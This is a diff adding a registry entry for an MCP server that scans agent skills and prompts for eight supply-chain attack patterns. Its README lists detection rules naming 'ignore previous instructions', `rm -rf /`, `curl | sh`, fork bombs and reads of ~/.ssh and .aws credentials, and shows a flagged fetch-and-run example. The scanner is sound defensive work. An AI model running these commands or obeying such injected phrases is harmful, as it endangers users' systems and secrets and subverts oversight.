@@ -1,0 +1,57 @@
+{
+  "id": "mcp:official/io.github.sudo-ai-git/mcp-skill-sec",
+  "type": "mcp",
+  "name": "mcp-skill-sec",
+  "description": "Audit agent skills/prompts against 8 supply-chain attack patterns. Deterministic, no-LLM scanner.",
+  "author": "io.github.sudo-ai-git",
+  "source": {
+    "registry": "mcp-official",
+    "url": "https://github.com/sudo-ai-git/mcp-skill-sec",
+    "repo": "sudo-ai-git/mcp-skill-sec"
+  },
+  "license": null,
+  "install": {
+    "kind": "pypi",
+    "command": "uvx",
+    "args": [
+      "mcp-skill-sec"
+    ]
+  },
+  "quality": {
+    "stars": null,
+    "pushed_at": "2026-08-27T22:35:10.765189Z",
+    "score": 52
+  },
+  "security": {
+    "score": 100,
+    "scanned": true,
+    "checks": [
+      {
+        "name": "描述层注入",
+        "pass": true
+      },
+      {
+        "name": "敏感路径",
+        "pass": true
+      },
+      {
+        "name": "外部渗出",
+        "pass": true
+      },
+      {
+        "name": "危险执行",
+        "pass": true
+      },
+      {
+        "name": "配置风险",
+        "pass": true
+      }
+    ]
+  },
+  "tags": {
+    "category": "AI",
+    "featured": false
+  },
+  "readme": "# mcp-skill-sec\n\nA Model Context Protocol (MCP) server that audits any agent skill, system\nprompt, or downloaded file collection against the **8 malicious-skill\nsupply-chain patterns**.\n\nDeterministic, no LLM, no network calls — a self-hostable pre-install scanner\nthat works with Claude Code, Cursor, Copilot, OpenClaw, Codex CLI, and any\nMCP-compatible agent.\n\n## What it scans for (rules R1–R8)\n\n| Rule | Pattern |\n|------|---------|\n| R1 | Prompt injection / instruction hijack (`ignore previous instructions`, secrecy directives, identity overrides) |\n| R2 | Data exfiltration intent (send/post/email contents to a URL, log theft) |\n| R3 | Hardcoded secrets / credentials (API keys, PATs, private keys, connection strings) |\n| R4 | Dangerous commands (`rm -rf /`, `curl \\| sh`, fork bombs, raw device writes) |\n| R5 | Obfuscation / hidden behavior (base64-exec, eval/exec, zero-width chars) |\n| R6 | Untrusted external fetches (fetch-and-run, non-PyPI installs) |\n| R7 | Credential access (reading `~/.ssh`, `.aws/credentials`, `.env`) |\n| R8 | Privilege escalation (`sudo -s`, setuid, adding to sudo group) |\n\nEach finding carries a `severity` (critical/high/medium/low), a line number,\nand the matching evidence line. The overall verdict is **PASS** only when\nthere are no critical/high findings and every medium finding is benign.\n\n## Tools\n\n- `audit_text(text, filename)` — audit a string (a skill you were pasted, a\n  system prompt you didn't write).\n- `audit_skill_file(path)` — audit a `SKILL.md` / `AGENTS.md` / `CLAUDE.md`\n  on disk, line-numbered evidence.\n- `audit_directory(path, pattern)` — audit a whole downloaded skills\n  collection; returns per-file verdicts + a summary.\n- `rule_list()` — dump the rule catalog.\n\n## Install & run\n\n**One command (recommended) — installs from the repo, no PyPI token needed:**\n\n```bash\nuv tool install git+https://github.com/sudo-ai-git/mcp-skill-sec\n# then register with your agent:\nmcp-skill-sec                       # run stdio server\nmcp-skill-sec --http --port 8137    # or Streamable HTTP for remote use\n```\n\nOr with `pipx`: `pipx install git+https://github.com/sudo-ai-git/mcp-skill-sec`\n\n**Direct from source (fallback):**\n\n```bash\npip install mcp\npython3 mcp_server.py               # run stdio\nmcp install mcp_server.py --name skill-sec   # register with Claude Desktop\n```\n\n### Claude Desktop / agent config\n\n```json\n{\n  \"mcpServers\": {\n    \"skill-sec\": {\n      \"command\": \"mcp-skill-sec\",\n      \"args\": []\n    }\n  }\n}\n```\n   \n## Example\n\n```text\nskill-sec: /tmp/downloaded-skill/SKILL.md\n  verdict : FLAG\n  counts  : critical 1, high 2, medium 1, low 0\n  R3 [critical] line 11: api_key = \"sk-live-…\"\n  R3 [high]     line 14: password = \"hunter2\"\n  R4 [critical] line 22: curl https://x/y.sh | sh\n  action : remove the literal secrets, drop the fetch-and-run, re-audit\n```\n\n## Part of a family\n\nThis is one of three **deterministic, no-LLM** agent-trust MCP servers by `sudo-ai-git`:\n\n- [`mcp-skill-sec`](https://github.com/sudo-ai-git/mcp-skill-sec) — pre-install skill/security audit (this repo)\n- [`mcp-verify-claim`](https://github.com/sudo-ai-git/mcp-verify-claim) — evidence-gated, honestly-tiered claim reporting\n- [`mcp-benchmark-hygiene`](https://github.com/sudo-ai-git/mcp-benchmark-hygiene) — pytest config-leakage / eval-honesty detection\n\n## License & provenance\n\nMIT. Written by `sudo-ai-git`. This is a standalone security/verification\ntool; it encodes no proprietary method. It is the MCP expression of the\n`skill-sec` agent skill (same rules, callable as a server instead of a skill).\n\n## Official MCP Registry metadata\n\nmcp-name: io.github.sudo-ai-git/mcp-skill-sec\n\n## Hire a custom integration\n\nNeed this connected to *your* internal system (auth, logging, security-scan pass, hosted)? Open a [custom-build request](https://github.com/sudo-ai-git/agensi-builds/issues/new?template=custom-build-request.yml). MIT reference assets are free to use either way.\n",
+  "status": "curated"
+}
